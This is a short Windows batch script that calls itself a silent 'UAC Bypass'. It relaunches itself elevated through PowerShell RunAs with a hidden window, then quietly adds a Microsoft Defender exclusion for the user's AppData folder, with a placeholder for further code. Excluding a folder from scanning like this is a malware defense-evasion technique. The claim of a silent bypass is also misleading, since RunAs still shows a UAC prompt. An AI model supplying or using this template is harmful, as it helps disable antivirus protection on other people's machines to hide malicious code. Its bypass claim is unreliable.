@echo off
>nul 2>&1

:: UAC Bypass - Get admin privileges silently
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process cmd -ArgumentList '/c %0' -Verb RunAs -WindowStyle Hidden"
    exit
)

:: Now running as admin silently
echo Running as administrator...

:: Your batch code here
echo Adding Defender exclusions...
powershell -Command "Add-MpPreference -ExclusionPath '%APPDATA%'" >nul 2>&1

exit
